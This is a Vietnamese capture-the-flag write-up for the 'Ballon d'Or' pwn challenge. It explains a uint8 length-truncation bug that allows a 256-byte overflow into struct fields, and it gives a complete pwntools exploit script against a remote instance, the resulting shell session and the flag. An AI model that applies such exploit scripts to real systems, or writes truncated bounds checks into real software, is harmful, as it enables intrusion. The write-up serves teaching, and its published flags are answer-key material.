---
title: Ballon d'Or
category: pwn
techniques: reverse-engineering, ida-decompiler, integer-truncation, out-of-bounds-write, structure-field-overwrite, pwntools-interactive
summary: Khai thác lỗi ép length về uint8_t khi kiểm tra giới hạn note, từ đó ghi 256 byte vào cấu trúc Ballot để sửa nominee_id và approval_code, vượt qua submit_ballot và lấy shell trên remote.
---

## Đề bài

Challenge `Ballon d'Or` cung cấp một chương trình dạng menu cho phép chọn nominee, thêm note, submit ballot và review winner. Mục tiêu là tìm cách vượt qua điều kiện của `submit_ballot()` để đi đến nhánh thành công.

Trong quá trình phân tích, cần phân biệt hai nhánh khác nhau:

- Menu `4` gọi hàm `vuln()`. Trong binary local được mở bằng IDA, hàm này chỉ in một flag tĩnh có nội dung `BKISC{we_all_know_the_GOAT_is_Messi}`.
- Luồng khai thác lấy flag remote sử dụng menu `2` để ghi note, sau đó menu `3` để gọi `submit_ballot()`. Payload ghi đè các trường trong `Ballot`; khi điều kiện hợp lệ, chương trình gọi `reveal_result()`. Trên remote, luồng này đưa kết nối tới shell tương tác.

Flag thật được xác nhận từ `flag.txt` trên instance remote, không phải chuỗi flag tĩnh trong `vuln()`.

## Kỹ thuật sử dụng

- **integer-truncation**: chương trình ép `length` về `unsigned __int8` khi kiểm tra giới hạn. Giá trị `256` bị chuyển thành `0`, khiến phép kiểm tra sai lệch.
- **out-of-bounds-write**: sau khi kiểm tra bằng giá trị đã bị truncate, chương trình vẫn truyền `length` gốc vào hàm đọc dữ liệu, cho phép ghi 256 byte vào vùng `Ballot` có phần note dự kiến chỉ dài `0x40` byte.
- **structure-field-overwrite**: dữ liệu vượt khỏi note ghi đè `approval_code` và `nominee_id` trong cấu trúc `Ballot`.
- **IDA static analysis**: decompile `main()`, `write_ballot_note()`, `submit_ballot()` và `vuln()` để xác định luồng điều khiển và điều kiện thành công.
- **little-endian encoding**: dùng `p64()` và `p32()` để đặt đúng giá trị vào các trường số nguyên.
- **pwntools remote/interactive**: gửi payload tới instance TCP và tương tác với shell sau khi nhánh thành công được kích hoạt.

## Cách giải

### Bước 1. Mở binary và đọc menu trong `main()` bằng IDA

Mở binary trong IDA, chờ auto-analysis hoàn tất, chọn hàm `main` trong cửa sổ Functions và nhấn `F5` để xem pseudocode.

Đoạn `main()` cho thấy chương trình có các lựa chọn:

| Menu | Hàm được gọi | Chức năng |
|---:|---|---|
| `1` | `choose_nominee(&ballot)` | Chọn nominee |
| `2` | `write_ballot_note(&ballot)` | Ghi note vào ballot |
| `3` | `submit_ballot(&ballot)` | Submit ballot rồi kết thúc vòng menu |
| `4` | `vuln()` | Gọi hàm `vuln()` rồi quay lại menu |
| `5` | — | Thoát |

Luồng khai thác được xác nhận bằng log remote là **menu `2` → gửi note → menu `3`**. Menu `4` là một nhánh riêng, không phải bước cần thiết của payload này.


![IDA - main và các lựa chọn menu](https://github.com/chlorcale/chlorcale.github.io/blob/main/writeups/images/ballon/01-main-menu-ida.png?raw=true)

### Bước 2. Tìm lỗi trong `write_ballot_note()`

Pseudocode từ IDA:

```c
int64_t write_ballot_note(Ballot *ballot)
{
    uint32_t length;

    printf("> Note length in bytes: ");
    if (read_number(&length) == 0)
        return 0;

    if ((unsigned __int8)length <= 0x40u)
    {
        printf("> Enter note: ");
        if (read_exact((char *)ballot, length) != 0)
        {
            puts("Note saved.");
            return 1;
        }
        return 0;
    }
    else
    {
        puts("Note is too long.");
        return 1;
    }
}
```

Điểm lỗi nằm ở điều kiện:

```c
if ((unsigned __int8)length <= 0x40u)
```

`length` ban đầu là `uint32_t`, nhưng chỉ byte thấp nhất được dùng để kiểm tra. Sau đó, lời gọi:

```c
read_exact((char *)ballot, length);
```

lại dùng **giá trị `length` đầy đủ**, không phải giá trị đã ép về 8 bit.

Chọn `length = 256`:

\[
(uint8\_t)256 = 0
\]

Do đó điều kiện kiểm tra trở thành:

\[
0 \leq 0x40
\]

và được chấp nhận. Nhưng hàm đọc vẫn nhận độ dài 256 byte. Như vậy, chương trình cho phép ghi 256 byte bắt đầu từ địa chỉ `ballot`, dù điều kiện giới hạn được thiết kế để chỉ chấp nhận tối đa `0x40 = 64` byte.

Đây là lỗi **integer truncation trong bước kiểm tra độ dài**, dẫn đến **out-of-bounds write** khi hàm đọc sử dụng độ dài gốc.


![IDA - hàm write_ballot_note](https://github.com/chlorcale/chlorcale.github.io/blob/main/writeups/images/ballon/02-write-ballot-note.png?raw=true)

### Bước 3. Đọc điều kiện trong `submit_ballot()`

Pseudocode từ IDA:

```c
void submit_ballot(const Ballot *ballot)
{
    if (ballot->nominee_id == 4)
    {
        if (ballot->approval_code == 3405707982)
        {
            puts("The Ballon d'Or goes to...");
            reveal_result();
        }
        else
        {
            puts("Rejected: Invalid approval code.");
        }
    }
    else
    {
        puts("This ballot does not select the rightful winner.");
    }
}
```

Muốn đi vào nhánh gọi `reveal_result()`, hai điều kiện phải đồng thời đúng:

```c
ballot->nominee_id == 4
ballot->approval_code == 3405707982
```

Giá trị thập phân `3405707982` tương ứng với hằng số hexadecimal:

```text
0xCAFEFACE
```

Như vậy, payload cần ghi hai giá trị này vào đúng vị trí của hai trường trong cấu trúc `Ballot`.


![IDA - hàm submit_ballot](https://github.com/chlorcale/chlorcale.github.io/blob/main/writeups/images/ballon/03-submit-ballot.png?raw=true)

### Bước 4. Xác định offset và xây dựng payload

Payload đã được kiểm chứng trên remote có tổng độ dài 256 byte:

```python
payload = bytearray(b"A" * 256)
payload[0x40:0x48] = p64(0xCAFEFACE)
payload[0x48:0x4C] = p32(4)
```

Bố cục dữ liệu:

| Offset | Kích thước | Giá trị | Mục đích |
|---|---:|---|---|
| `0x00–0x3F` | 64 byte | `A` | Lấp đầy vùng note 64 byte |
| `0x40–0x47` | 8 byte | `0xCAFEFACE` | Ghi đè `approval_code` |
| `0x48–0x4B` | 4 byte | `4` | Ghi đè `nominee_id` |
| `0x4C–0xFF` | 180 byte | `A` | Phần dữ liệu còn lại của lần ghi 256 byte |

Trên x86-64 little-endian:

```text
p64(0xCAFEFACE) = ce fa fe ca 00 00 00 00
p32(4)          = 04 00 00 00
```

Vùng `approval_code` nằm tại offset `0x40`, còn `nominee_id` nằm tại offset `0x48`, phù hợp với thứ tự ghi trong payload và các trường được `submit_ballot()` kiểm tra.

Lưu ý: việc gọi `read_exact((char *)ballot, length)` cho thấy dữ liệu được ghi từ đầu cấu trúc `Ballot`. Các offset trường được đối chiếu từ payload đã chạy thành công và điều kiện trong `submit_ballot()`; nếu muốn dựng lại đầy đủ định nghĩa `struct Ballot`, cần kiểm tra thêm type/offset trong Local Types hoặc disassembly.

### Bước 5. Tại sao 256 ký tự `A` không khai thác được?

Nếu chỉ gửi:

```python
payload = b"A" * 256
```

thì tất cả byte trong vùng ghi đều là `0x41`. Hai trường mà `submit_ballot()` kiểm tra sẽ không nhận được giá trị yêu cầu.

Payload cần thay riêng hai vùng:

```python
payload[0x40:0x48] = p64(0xCAFEFACE)
payload[0x48:0x4C] = p32(4)
```

Vì thế, lỗi độ dài giúp ta ghi vượt khỏi vùng note, nhưng cần ghi đúng các giá trị trên để vượt qua logic kiểm tra của `submit_ballot()`.

### Bước 6. Script khai thác remote bằng Pwntools

Lưu script sau thành `solve_remote.py`:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "136.85.118.253"
PORT = 30210

io = remote(HOST, PORT)

# Menu 2: Add a note
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Note length in bytes: ", b"256")
io.recvuntil(b"Enter note: ")

# Ghi đè các trường trong Ballot
payload = bytearray(b"A" * 256)
payload[0x40:0x48] = p64(0xCAFEFACE)
payload[0x48:0x4C] = p32(4)
assert len(payload) == 256

# Gửi đúng 256 byte, không nối thêm newline
io.send(bytes(payload))

# Menu 3: Submit ballot
io.sendlineafter(b"> ", b"3")

# Tương tác với shell phía remote nếu nhánh thành công mở shell
io.interactive()
```

Chạy:

```bash
python3 solve_remote.py
```

Trong log khai thác, server phản hồi `Note saved.` sau khi nhận payload, sau đó hiển thị lại menu. Script gửi lựa chọn `3` để gọi `submit_ballot()`.

### Bước 7. Phân biệt menu 4 và flag mồi trong `vuln()`

Trong IDA, hàm `vuln()` của binary local được decompile thành:

```c
void vuln(void)
{
    puts("Congratulations! You are the real winner. Flag: BKISC{we_all_know_the_GOAT_is_Messi}");
}
```

Hàm này chỉ in một chuỗi cố định. Nó không phải luồng khai thác đã dùng để lấy flag remote.

Trong `main()`:

```c
case 4:
    vuln();
    continue;
```

Menu `4` gọi `vuln()` rồi quay lại menu. Trong khi đó, exploit thực tế chọn menu `2` rồi menu `3`; `submit_ballot()` kiểm tra hai trường đã bị ghi đè và gọi `reveal_result()` khi hợp lệ.

Vì vậy, chuỗi `BKISC{we_all_know_the_GOAT_is_Messi}` trong `vuln()` là một flag tĩnh/flag mồi trong binary local. Không nên nhầm nó với flag thực tế lấy được từ `flag.txt` trên remote.


![IDA - hàm vuln và flag tĩnh](https://github.com/chlorcale/chlorcale.github.io/blob/main/writeups/images/ballon/04-vuln-decoy.png?raw=true)

### Bước 8. Vì sao xuất hiện prompt `$` và vai trò của `io.interactive()`

Sau khi gửi lựa chọn `3`, log remote ghi nhận:

```text
Submitting ballot...
The Ballon d'Or goes to...
$
```

Tiếp đó, các lệnh được gửi qua cùng kết nối TCP:

```text
$ whoami
ctf
$ ls
ballon-dor
flag.txt
```

Điều này xác nhận phía remote đã chuyển kết nối sang một shell hoặc môi trường tương tác nhận lệnh. Tuy nhiên, log không đủ để xác định chính xác cơ chế nội bộ được dùng để tạo shell; cần pseudocode của `reveal_result()` để kết luận nó gọi `system()`, `execve()` hay cơ chế khác.

Trong exploit, `io.interactive()` chỉ chuyển tiếp dữ liệu hai chiều giữa terminal của người khai thác và kết nối Pwntools. Nó **không tự tạo shell**.

Phân biệt các công cụ:

| Thành phần | Vai trò |
|---|---|
| IDA | Phân tích tĩnh, đọc assembly và pseudocode |
| GDB | Debug tiến trình, breakpoint, thanh ghi và bộ nhớ |
| `process()` | Chạy binary local qua Pwntools |
| `remote()` | Kết nối đến dịch vụ TCP từ xa |
| `interactive()` | Chuyển sang giao tiếp thủ công qua tube hiện tại |
| Shell phía đích | Nhận và thực thi lệnh nếu chương trình/instance đã mở shell |

### Bước 9. Kết quả khai thác và flag

Log thực tế trên remote:

```text
[+] Opening connection to 136.85.118.253 on port 30210: Done

[DEBUG] Sent 0x2 bytes:
    b'2\\n'

[DEBUG] Sent 0x4 bytes:
    b'256\\n'

[DEBUG] Sent 0x100 bytes:
    ...
    00000040  ce fa fe ca 00 00 00 00 04 00 00 00 ...

Note saved.

[DEBUG] Sent 0x2 bytes:
    b'3\\n'

Submitting ballot...
The Ballon d'Or goes to...
$ whoami
ctf
$ ls
ballon-dor
flag.txt
$ cat flag.txt
BKISC{th3_goat_1s_ov3rflow1ng_w1th_joys_5a38c7f6b2af}
```

Kết quả chứng minh payload đã được nhận, các điều kiện của `submit_ballot()` đã được vượt qua và remote cho phép đọc `flag.txt` thông qua shell tương tác.

### Bước 10. Vì sao local có thể khác remote?

Không nên kết luận local và remote có cùng hành vi chỉ vì có cùng tên challenge. Có thể kiểm tra hash của hai binary nếu có cả hai bản để xác định chúng có giống nhau hay không.

Ngoài ra, cần phân biệt:

- `vuln()` trong ảnh IDA chỉ in flag tĩnh.
- `submit_ballot()` gọi `reveal_result()` khi hai trường ballot đúng.
- Log remote chứng minh nhánh submit dẫn đến shell tương tác.
- Chưa có pseudocode `reveal_result()` trong tài liệu này, nên chưa thể khẳng định chính xác lệnh tạo shell nằm ở đâu.

## Flag

`BKISC{th3_goat_1s_ov3rflow1ng_w1th_joys_5a38c7f6b2af}`
